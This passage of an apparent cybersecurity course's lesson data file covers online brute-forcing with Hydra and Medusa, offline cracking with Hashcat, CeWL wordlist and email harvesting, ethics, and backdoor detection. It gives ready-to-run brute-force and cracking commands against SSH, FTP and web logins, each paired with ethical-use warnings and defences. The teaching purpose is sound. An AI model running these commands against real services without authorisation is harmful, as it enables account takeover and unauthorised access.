                  <h4 class="text-lg font-semibold text-white mb-3">Defensive Measures</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Enable account lockout policies</li>
                    <li>Implement rate limiting</li>
                    <li>Use strong, unique passwords</li>
                    <li>Disable default credentials</li>
                    <li>Enforce Multi-Factor Authentication (MFA)</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Password Cracking with Hydra (SSH, FTP, HTTP)',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Password Cracking with Hydra (SSH, FTP, HTTP)</h2>
          <p class="mb-4 text-gray-300">
            Using Hydra to test authentication security on real network services such as SSH, FTP, and HTTP is a common practice during authorized penetration testing. This topic focuses on understanding how attackers attempt to break weak login mechanisms and, more importantly, how defenders can detect, prevent, and mitigate these attacks.
          </p>
          <p class="mb-4 text-gray-300">
            Hydra performs online authentication attacks, meaning it sends real login requests to a live service. Because of this, it closely simulates real-world attack scenarios. If a service lacks proper security controls—such as strong passwords, rate limiting, CAPTCHA, account lockout, or MFA—Hydra can quickly identify valid credentials.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Targeted Services</h3>
          <div class="space-y-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">SSH (Secure Shell)</h4>
              <p class="text-sm text-gray-300">SSH attacks are common because SSH is widely used for remote server administration. Systems with default usernames, reused passwords, or exposed SSH services become easy targets.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">FTP (File Transfer Protocol)</h4>
              <p class="text-sm text-gray-300">FTP attacks are frequent in legacy environments. Many FTP servers are misconfigured with weak or anonymous credentials, making them vulnerable to brute-force and dictionary attacks.</p>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">HTTP/HTTPS Forms</h4>
              <p class="text-sm text-gray-300">HTTP attacks target web-based login forms. These are more complex because Hydra must understand how the login request is structured (POST parameters, cookies, failure messages). Poorly designed login pages without rate limiting are highly vulnerable.</p>
            </div>
          </div>

          <h3 class="text-lg font-semibold mb-2 text-white">Common Mistakes That Enable Hydra Attacks</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Default or weak passwords</li>
            <li>No rate limiting on login attempts</li>
            <li>No account lockout policies</li>
            <li>Exposed admin panels</li>
            <li>Lack of MFA</li>
            <li>Poor logging and monitoring</li>
          </ul>
        `,
        syntax: [
          {
            title: 'Hydra Service Attacks (Ethical Use Only)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Hydra Attacks on Common Services</h4>
                  <p class="text-gray-300 mb-4">Ethical Use Only: Use only in controlled lab environments or with written permission.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Service-Specific Commands</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -l user -P passwords.txt ssh://192.168.1.10</code>
                      <p class="text-sm text-gray-400">SSH Password Attack.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -l ftpuser -P passwords.txt ftp://192.168.1.20</code>
                      <p class="text-sm text-gray-400">FTP Password Attack.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -l admin -P passwords.txt 192.168.1.30 http-post-form "/login.php:username=^USER^&password=^PASS^:Invalid login"</code>
                      <p class="text-sm text-gray-400">HTTP POST Form Attack (Targeting a web login page).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -l admin -P passwords.txt 192.168.1.30 http-get</code>
                      <p class="text-sm text-gray-400">HTTP GET Login Attack.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -s 2222 -t 4 -l user -P passwords.txt ssh://192.168.1.10</code>
                      <p class="text-sm text-gray-400">Specify Custom Port and Threads.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hydra -f -l admin -P passwords.txt ssh://192.168.1.10</code>
                      <p class="text-sm text-gray-400">Stop After First Valid Password (Efficient).</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Defensive Countermeasures</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Enable account lockout after failed attempts</li>
                    <li>Implement rate limiting and CAPTCHA</li>
                    <li>Use strong, unique passwords</li>
                    <li>Enforce MFA</li>
                    <li>Monitor authentication logs</li>
                    <li>Restrict access using firewall rules</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Hashcat Basics & GPU Cracking',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Hashcat Basics & GPU Cracking</h2>
          <p class="mb-4 text-gray-300">
            Hashcat is one of the fastest and most powerful password recovery and auditing tools used in cyber security today. Unlike online tools such as Hydra, Hashcat is primarily used for offline password cracking, where the attacker or tester already possesses password hashes obtained through authorized means (for example, during a penetration test or forensic investigation). Because it works offline, Hashcat is not limited by account lockouts, rate limiting, or network latency, making it extremely effective against weak passwords.
          </p>
          <p class="mb-4 text-gray-300">
            What truly sets Hashcat apart is its ability to leverage hardware acceleration, especially GPUs (Graphics Processing Units). GPUs are designed to perform thousands of parallel computations, which makes them ideal for hashing operations. Compared to CPU-based cracking, GPU cracking can be tens or even hundreds of times faster, depending on the hash type and hardware used. This speed advantage demonstrates why weak or unsalted hashes pose a serious security risk.
          </p>
          <p class="mb-4 text-gray-300">
            Hashcat supports a massive range of hash algorithms, including MD5, SHA1, SHA256, NTLM, bcrypt, WPA/WPA2 handshakes, and many application-specific formats. It also supports multiple attack modes such as dictionary attacks, rule-based attacks, mask attacks, and hybrid attacks, allowing security professionals to simulate real-world password creation habits accurately.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Defensive Perspective</h3>
          <p class="mb-4 text-gray-300">
            From a defensive perspective, learning Hashcat highlights the importance of:
          </p>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Using slow, memory-hard hashing algorithms (bcrypt, scrypt, Argon2)</li>
            <li>Applying unique salts to every password</li>
            <li>Enforcing long and random passwords</li>
            <li>Implementing MFA to reduce reliance on passwords alone</li>
          </ul>
          <p class="mb-4 text-gray-300">
            Hashcat is not a “magic tool.” Its effectiveness depends on the strength of the hashing algorithm, the quality of the passwords, and the available hardware. Strong security practices can make Hashcat attacks computationally infeasible.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">CPU vs GPU Cracking (Conceptual)</h3>
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">CPU Cracking</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Limited parallelism</li>
                <li>Slower hash computation</li>
                <li>Suitable for learning and small tests</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">GPU Cracking</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Massive parallel processing</li>
                <li>Extremely fast</li>
                <li>Demonstrates real-world attacker capability</li>
              </ul>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Hashcat Basics (Ethical Use Only)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Hashcat Basics</h4>
                  <p class="text-gray-300 mb-4">Ethical Use Only: Use Hashcat only on hashes you own or are authorized to test.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Basic Commands</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hashcat --version</code>
                      <p class="text-sm text-gray-400">Check Hashcat Installation.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hashcat -h | less</code>
                      <p class="text-sm text-gray-400">List Supported Hash Modes.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hashid hash.txt</code>
                      <p class="text-sm text-gray-400">Identify Hash Type (Preparation).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt</code>
                      <p class="text-sm text-gray-400">Basic Dictionary Attack (MD5 Example). -m 0 = MD5, -a 0 = Dictionary.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hashcat -m 1000 -a 0 hash.txt rockyou.txt</code>
                      <p class="text-sm text-gray-400">NTLM Hash Cracking (Windows Hashes).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hashcat -m 0 -a 0 hash.txt rockyou.txt -r rules/best64.rule</code>
                      <p class="text-sm text-gray-400">Rule-Based Attack.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hashcat -m 0 -a 3 hash.txt ?u?l?l?l?d?d</code>
                      <p class="text-sm text-gray-400">Mask Attack (Pattern-Based: Uppercase + lowercase + digits).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hashcat -m 0 --show hash.txt</code>
                      <p class="text-sm text-gray-400">Show Cracked Passwords.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">hashcat --restore</code>
                      <p class="text-sm text-gray-400">Resume Interrupted Session.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Defensive Lessons from Hashcat</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Fast hashes (MD5, SHA1) are insecure</li>
                    <li>Salting prevents rainbow table attacks</li>
                    <li>Slow hashes drastically reduce cracking speed</li>
                    <li>Long passwords defeat brute-force methods</li>
                    <li>MFA reduces impact even if passwords leak</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'CeWL – Wordlist Generator',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">CeWL – Wordlist Generator</h2>
          <p class="mb-4 text-gray-300">
            CeWL (Custom Word List Generator) is a powerful OSINT-based wordlist generation tool used in ethical hacking and penetration testing. Unlike generic wordlists such as RockYou, CeWL creates target-specific wordlists by crawling websites and extracting words that are highly relevant to a particular organization, brand, or individual. This makes CeWL extremely effective in real-world password attacks, where users often base passwords on familiar names, products, locations, slogans, or internal terminology.
          </p>
          <p class="mb-4 text-gray-300">
            CeWL works by spidering a target website to a specified depth and collecting words that meet certain criteria such as minimum length. The idea is simple but very effective: people tend to create passwords using words they recognize or associate with their environment. For example, employees might use company names, project names, product models, city names, or leadership names as part of their passwords.
          </p>
          <p class="mb-4 text-gray-300">
            From a security perspective, CeWL demonstrates why organization-aware passwords are dangerous. Even if a password looks complex, it can still be weak if it is derived from publicly available information. CeWL is commonly used in the reconnaissance phase of penetration testing to prepare high-quality wordlists that significantly improve the success rate of tools like John the Ripper, Hashcat, and Hydra.
          </p>
          <p class="mb-4 text-gray-300">
            CeWL also supports generating:
          </p>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Username lists</li>
            <li>Email address lists</li>
            <li>Metadata-based wordlists</li>
            <li>Custom output formats</li>
          </ul>
          <p class="mb-4 text-gray-300">
            Because CeWL interacts with public websites, it is less intrusive than brute-force tools, but it must still be used responsibly and only against authorized targets.
          </p>

          <h3 class="text-lg font-semibold mb-2 text-white">Why CeWL Is Powerful</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Creates highly targeted wordlists</li>
            <li>Uses publicly available information</li>
            <li>Improves success rate of cracking tools</li>
            <li>Demonstrates OSINT risks</li>
            <li>Highlights importance of password hygiene</li>
          </ul>
        `,
        syntax: [
          {
            title: 'CeWL Basic Commands (Ethical Use Only)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">CeWL Basic Commands</h4>
                  <p class="text-gray-300 mb-4">Ethical Use Only: Use only on websites you have permission to scan or own.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Basic Usage</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">cewl --help</code>
                      <p class="text-sm text-gray-400">Check CeWL Installation and help menu.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">cewl http://example.com -w wordlist.txt</code>
                      <p class="text-sm text-gray-400">Generate a Basic Wordlist from a Website.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">cewl http://example.com -d 3 -w wordlist.txt</code>
                      <p class="text-sm text-gray-400">Set Crawl Depth (How many links deep to follow).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">cewl http://example.com -m 6 -w wordlist.txt</code>
                      <p class="text-sm text-gray-400">Specify Minimum Word Length (e.g., 6 chars).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">cewl http://example.com --meta --meta_file users.txt</code>
                      <p class="text-sm text-gray-400">Generate Username List from Metadata.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">cewl http://example.com -e --email_file emails.txt</code>
                      <p class="text-sm text-gray-400">Generate Email Addresses List.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">cewl http://example.com -v</code>
                      <p class="text-sm text-gray-400">Verbose Output (Learning Mode - shows what it finds).</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Defensive Measures Against CeWL-Based Attacks</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Avoid using organization-related words in passwords</li>
                    <li>Use password managers for random passwords</li>
                    <li>Enforce long, unpredictable passwords</li>
                    <li>Educate users about OSINT risks</li>
                    <li>Implement MFA</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Medusa – Parallel Bruteforce Tool',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Medusa – Parallel Bruteforce Tool</h2>
          <p class="mb-4 text-gray-300">
            Medusa is a fast, modular, and highly efficient online password brute‑force and credential testing tool designed for parallel execution. Like Hydra, Medusa targets live network services, but it is especially known for its threaded architecture, which allows it to perform many authentication attempts simultaneously while maintaining stability and control. This makes Medusa suitable for testing large environments with multiple services and user accounts—only in authorized scenarios.
          </p>
          <p class="mb-4 text-gray-300">
            Medusa supports a wide range of network protocols including SSH, FTP, Telnet, HTTP, SMB, MySQL, PostgreSQL, POP3, IMAP, and more. Its modular design means each protocol has a dedicated module that understands how authentication works for that service. This reduces errors and increases accuracy during testing.
          </p>
          <p class="mb-4 text-gray-300">
            One of Medusa’s key strengths is its ability to handle multiple usernames and passwords efficiently. Instead of testing one username at a time, Medusa can iterate across lists of users and passwords concurrently, which is particularly useful in enterprise environments where attackers often attempt credential stuffing or password spraying.
          </p>
          <p class="mb-4 text-gray-300">
            From a defensive standpoint, Medusa clearly demonstrates how parallel login attempts can overwhelm weak authentication systems. Systems without rate limiting, account lockout policies, or monitoring are especially vulnerable. By understanding Medusa, defenders learn why basic security hygiene—such as MFA, logging, and throttling—can completely neutralize such attacks.
          </p>
          
          <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Medusa</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Highly parallel and stable</li>
                <li>Efficient for large user lists</li>
                <li>Modular protocol support</li>
              </ul>
            </div>
            <div class="bg-[#1e1e1e] p-4 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-2">Hydra</h4>
              <ul class="list-disc list-inside text-gray-300 space-y-1">
                <li>Extremely flexible</li>
                <li>Very popular and widely supported</li>
                <li>Strong community usage</li>
              </ul>
            </div>
          </div>
          <p class="mb-4 text-gray-300 font-semibold">
            Both tools emphasize the same lesson: weak credentials are the real vulnerability.
          </p>
        `,
        syntax: [
          {
            title: 'Medusa Basic Commands (Ethical Use Only)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Medusa Basic Commands</h4>
                  <p class="text-gray-300 mb-4">Ethical Use Only: Use only in lab environments or with written authorization.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Basic Usage</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">medusa -h</code>
                      <p class="text-sm text-gray-400">Check Medusa Installation.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">medusa -d</code>
                      <p class="text-sm text-gray-400">List Supported Modules.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh</code>
                      <p class="text-sm text-gray-400">Basic SSH Attack (Single User).</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">medusa -h 192.168.1.10 -U users.txt -P passwords.txt -M ssh</code>
                      <p class="text-sm text-gray-400">Multiple Users and Passwords.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -t 4</code>
                      <p class="text-sm text-gray-400">Set Number of Threads.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">medusa -h 192.168.1.20 -U users.txt -P passwords.txt -M ftp</code>
                      <p class="text-sm text-gray-400">FTP Brute-Force Example.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -f</code>
                      <p class="text-sm text-gray-400">Stop on First Valid Credential.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">medusa -v 6 -h 192.168.1.10 -u admin -P passwords.txt -M ssh</code>
                      <p class="text-sm text-gray-400">Verbose Output for Learning.</p>
                    </div>
                  </div>
                </div>
                
                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Defensive Countermeasures</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Enable account lockout policies</li>
                    <li>Implement rate limiting</li>
                    <li>Use strong, unique passwords</li>
                    <li>Enforce Multi-Factor Authentication</li>
                    <li>Monitor authentication logs and alerts</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      },
      {
        title: 'Ethical Use of Password Cracking Tools',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">Ethical Use of Password Cracking Tools</h2>
          <p class="mb-4 text-gray-300">
            The ethical use of password cracking tools is one of the most important concepts in cyber security education. Tools like John the Ripper, Hashcat, Hydra, Medusa, and CeWL are not illegal by themselves—their legality and morality depend entirely on how, where, and why they are used. Cyber security professionals study and use these tools to improve security, not to cause harm.
          </p>
          <p class="mb-4 text-gray-300">
            In professional environments, password cracking is conducted only after receiving explicit written authorization from the system owner. This authorization clearly defines the scope of testing, including which systems, services, accounts, and timeframes are allowed. Operating outside this scope—even accidentally—can lead to legal consequences.
          </p>
          
          <h3 class="text-lg font-semibold text-white mb-2">Common Use Cases</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Penetration testing</li>
            <li>Red team assessments</li>
            <li>Security audits</li>
            <li>Incident response investigations</li>
            <li>Academic labs and CTF environments</li>
          </ul>

          <p class="mb-4 text-gray-300">
            The primary goal is to identify weak passwords and insecure authentication mechanisms, not to exploit them. Once weak credentials are discovered, the ethical responsibility of the tester is to report findings responsibly, avoid unnecessary access to sensitive data, and recommend remediation steps such as stronger password policies, MFA implementation, or account lockout controls.
          </p>

          <p class="mb-4 text-gray-300">
            Unauthorized password cracking is considered a criminal offense under cyber laws in most countries. Even attempting to log in to a system without permission—using guessed or default credentials—can be classified as illegal access. This is why ethical hackers strictly follow codes of conduct, legal agreements (NDA), and professional standards.
          </p>
          
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-6">
             <p class="text-gray-300 italic">
               "Understanding ethical boundaries builds trust between security professionals and organizations. Without ethics, technical skills become dangerous rather than valuable."
             </p>
          </div>

          <h3 class="text-lg font-semibold text-white mb-4">Key Ethical Principles</h3>
          <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4 mb-4">
            <div class="bg-[#252526] p-3 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-1">Authorization</h4>
              <p class="text-sm text-gray-400">Always obtain written permission before testing.</p>
            </div>
            <div class="bg-[#252526] p-3 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-1">Scope Compliance</h4>
              <p class="text-sm text-gray-400">Test only what is approved—nothing more.</p>
            </div>
            <div class="bg-[#252526] p-3 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-1">Minimal Impact</h4>
              <p class="text-sm text-gray-400">Avoid service disruption and account lockouts.</p>
            </div>
            <div class="bg-[#252526] p-3 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-1">Confidentiality</h4>
              <p class="text-sm text-gray-400">Protect discovered credentials and sensitive data.</p>
            </div>
            <div class="bg-[#252526] p-3 rounded border border-[#333]">
              <h4 class="font-semibold text-[#00bceb] mb-1">Responsible Disclosure</h4>
              <p class="text-sm text-gray-400">Report findings securely and professionally.</p>
            </div>
          </div>
        `,
        syntax: [
          {
            title: 'Safe & Ethical Practices (Operational Discipline)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Operational Discipline</h4>
                  <p class="text-gray-300 mb-4">These commands support ethical workflow, not exploitation.</p>
                </div>

                <div class="space-y-4">
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono">hydra -t 2 -l user -P passwords.txt ssh://target</code>
                    <p class="text-sm text-gray-400">Limit Attack Speed (Avoid Lockouts).</p>
                  </div>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono">127.0.0.1</code>
                    <p class="text-sm text-gray-400">Test Against Local Lab Services Only.</p>
                  </div>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono">nano pentest_report.txt</code>
                    <p class="text-sm text-gray-400">Document Findings Securely.</p>
                  </div>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono">chmod 600 credentials.txt</code>
                    <p class="text-sm text-gray-400">Secure Discovered Credentials.</p>
                  </div>
                  <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                    <code class="text-green-400 block mb-1 font-mono">rm -rf test_wordlists/</code>
                    <p class="text-sm text-gray-400">Clear Testing Artifacts After Assessment.</p>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Legal & Professional Standards</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Follow client contracts and NDAs</li>
                    <li>Respect privacy and data protection laws</li>
                    <li>Adhere to organizational security policies</li>
                    <li>Follow frameworks like OSCP, CEH, and ISO standards</li>
                  </ul>
                </div>
              </div>
            `
          }
        ]
      }
    ]
  },
  {
    id: 'module-3',
    title: 'Module 3: Backdoors & Persistence',
    duration: '1 week',
    description: 'Understand how attackers maintain access and how to detect persistence mechanisms.',
    lessons: [
      {
        title: 'What is a Backdoor?',
        duration: '15 min',
        content: `
          <h2 class="text-xl font-semibold mb-4 text-white">What is a Backdoor?</h2>
          <p class="mb-4 text-gray-300">
            A backdoor is a hidden method of bypassing normal authentication or security controls to gain access to a system, application, or network. Backdoors are designed to provide unauthorized or covert access while avoiding detection by users, administrators, and sometimes even security tools. In cyber security, understanding backdoors is critical because they are commonly used in advanced attacks, malware infections, and post‑exploitation activities.
          </p>
          <p class="mb-4 text-gray-300">
            Backdoors can be intentionally created or maliciously planted. In some cases, developers leave backdoors in software for debugging or maintenance purposes. While these may be created with good intentions, they become serious security risks if discovered by attackers. Malicious backdoors, on the other hand, are deliberately installed by attackers after compromising a system, allowing them to re‑enter the system at any time without repeating the initial attack.
          </p>
          <p class="mb-4 text-gray-300">
            Once a backdoor is established, an attacker can remotely:
          </p>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li>Access files and databases</li>
            <li>Execute system commands</li>
            <li>Install additional malware</li>
            <li>Monitor user activity</li>
            <li>Maintain long‑term control</li>
          </ul>
          <p class="mb-4 text-gray-300">
            Backdoors are a key component of persistence, meaning they allow attackers to survive system reboots, password changes, and even partial cleanup efforts. Many modern attacks focus less on breaking in and more on staying in undetected.
          </p>
          <h3 class="text-lg font-semibold mb-2 text-white">Levels of Backdoors</h3>
          <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
            <li><strong>Application-level backdoors:</strong> hidden admin panels, hardcoded credentials</li>
            <li><strong>OS-level backdoors:</strong> malicious services, startup scripts</li>
            <li><strong>Network-level backdoors:</strong> open ports, rogue services</li>
            <li><strong>Firmware-level backdoors:</strong> BIOS/UEFI malware – very advanced</li>
          </ul>
          <p class="mb-4 text-gray-300">
            From a defensive perspective, studying backdoors helps security teams understand how attackers maintain access, which enables better detection, incident response, and system hardening.
          </p>
          <div class="bg-[#1e1e1e] p-4 rounded border border-[#333] mb-4">
            <h4 class="font-semibold text-[#00bceb] mb-2">Common Characteristics of Backdoors</h4>
            <ul class="list-disc list-inside text-gray-300 space-y-1">
              <li>Operate silently in the background</li>
              <li>Bypass authentication mechanisms</li>
              <li>Use encrypted or disguised communication</li>
              <li>Blend in with legitimate processes</li>
              <li>Designed for long‑term access</li>
            </ul>
          </div>
        `,
        syntax: [
          {
            title: 'Backdoor Detection & Analysis (Ethical / Defensive)',
            content: `
              <div class="space-y-6">
                <div>
                  <h4 class="text-lg font-semibold text-white mb-2">Backdoor Detection & Analysis</h4>
                  <p class="text-gray-300 mb-4">⚠️ These commands are for detection, analysis, and learning, not for creating backdoors.</p>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Detection Commands</h4>
                  <div class="space-y-4">
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">ss -tulnp</code>
                      <p class="text-sm text-gray-400">Check Open Network Ports. Used to identify unexpected listening services.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">ps aux</code>
                      <p class="text-sm text-gray-400">List Running Processes. Helps detect suspicious or unknown processes.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">systemctl list-unit-files --type=service</code>
                      <p class="text-sm text-gray-400">Check Startup Services (Linux). Identifies services that persist across reboots.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">crontab -l</code>
                      <p class="text-sm text-gray-400">Search for Suspicious Cron Jobs. Cron jobs are often abused for persistence.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">cat /etc/passwd</code>
                      <p class="text-sm text-gray-400">Check User Accounts. Detects unauthorized or hidden users.</p>
                    </div>
                    <div class="bg-[#1e1e1e] p-3 rounded border border-[#333]">
                      <code class="text-green-400 block mb-1 font-mono">netstat -antp</code>
                      <p class="text-sm text-gray-400">Network Connection Monitoring. Reveals active outbound connections to unknown hosts.</p>
                    </div>
                  </div>
                </div>

                <div>
                  <h4 class="text-lg font-semibold text-white mb-3">Defensive Measures</h4>
                  <ul class="list-disc list-inside text-gray-300 mb-4 space-y-1">
                    <li>Monitor startup programs and services</li>
                    <li>Restrict administrative privileges</li>
